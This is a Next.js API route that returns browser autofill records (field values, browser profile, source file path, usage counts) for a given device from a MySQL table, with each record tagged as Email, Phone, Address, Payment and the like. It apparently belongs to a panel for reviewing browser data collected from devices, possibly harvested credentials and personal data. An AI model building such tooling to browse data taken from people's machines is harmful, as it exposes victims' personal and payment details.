import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/devices/[deviceId]/autofill
 * Get autofill data for a device
 * Query params:
 *   - limit: Results limit (default 100)
 *   - offset: Pagination offset (default 0)
 *   - browser: Filter by browser
 *   - field_type: Filter by field name pattern (email, phone, address, etc.)
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    const { deviceId } = params
    const { searchParams } = new URL(request.url)

    const limit = Number.parseInt(searchParams.get("limit") || "100")
    const offset = Number.parseInt(searchParams.get("offset") || "0")
    const browser = searchParams.get("browser") || ""
    const fieldType = searchParams.get("field_type") || ""

    let query = `
      SELECT
        id,
        device_id,
        field_name,
        field_value,
        times_used,
        browser,
        profile,
        file_path,
        created_at
      FROM autofill
      WHERE device_id = ?
    `

    const queryParams: any[] = [deviceId]

    // Browser filter
    if (browser) {
      query += ` AND browser = ?`
      queryParams.push(browser)
    }

    // Field type filter (search in field_name)
    if (fieldType) {
      query += ` AND field_name LIKE ?`
      queryParams.push(`%${fieldType}%`)
    }

    // Get total count
    const countQuery = query.replace(/SELECT[\s\S]*?FROM/, "SELECT COUNT(*) as total FROM")
    const countResult = (await executeQuery(countQuery, queryParams)) as any[]
    const total = countResult[0]?.total || 0

    // Add ordering and pagination
    query += ` ORDER BY times_used DESC, created_at DESC LIMIT ? OFFSET ?`
    queryParams.push(limit, offset)

    const autofillData = (await executeQuery(query, queryParams)) as any[]

    // Categorize autofill data
    const categorized = categorizeAutofillData(autofillData)

    // Get browser breakdown
    const browserBreakdown = await executeQuery(
      `
      SELECT
        browser,
        COUNT(*) as count
      FROM autofill
      WHERE device_id = ?
      GROUP BY browser
      ORDER BY count DESC
    `,
      [deviceId]
    )

    return NextResponse.json({
      success: true,
      total,
      limit,
      offset,
      autofill: autofillData.map((item) => ({
        id: item.id,
        device_id: item.device_id,
        field_name: item.field_name,
        field_value: item.field_value,
        times_used: item.times_used || 0,
        browser: item.browser || "Unknown",
        profile: item.profile,
        file_path: item.file_path,
        created_at: item.created_at,
        category: categorizeField(item.field_name)
      })),
      summary: {
        total_fields: total,
        categories: categorized,
        browsers: browserBreakdown
      }
    })
  } catch (error) {
    console.error("Error fetching autofill data:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to fetch autofill data"
      },
      { status: 500 }
    )
  }
}

/**
 * Categorize a field name
 */
function categorizeField(fieldName: string): string {
  const name = fieldName.toLowerCase()

  if (name.includes("email") || name.includes("e-mail")) return "Email"
  if (name.includes("phone") || name.includes("tel") || name.includes("mobile")) return "Phone"
  if (name.includes("address") || name.includes("street") || name.includes("city") || name.includes("zip") || name.includes("postal")) return "Address"
  if (name.includes("name") || name.includes("first") || name.includes("last")) return "Name"
  if (name.includes("card") || name.includes("credit")) return "Payment"
  if (name.includes("company") || name.includes("organization")) return "Company"
  if (name.includes("date") || name.includes("birth")) return "Date"
  if (name.includes("search") || name.includes("query")) return "Search"

  return "Other"
}

/**
 * Categorize all autofill data
 */
function categorizeAutofillData(data: any[]) {
  const categories: Record<string, number> = {}

  data.forEach((item) => {
    const category = categorizeField(item.field_name)
    categories[category] = (categories[category] || 0) + 1
  })

  return Object.entries(categories).map(([category, count]) => ({
    category,
    count
  })).sort((a, b) => b.count - a.count)
}
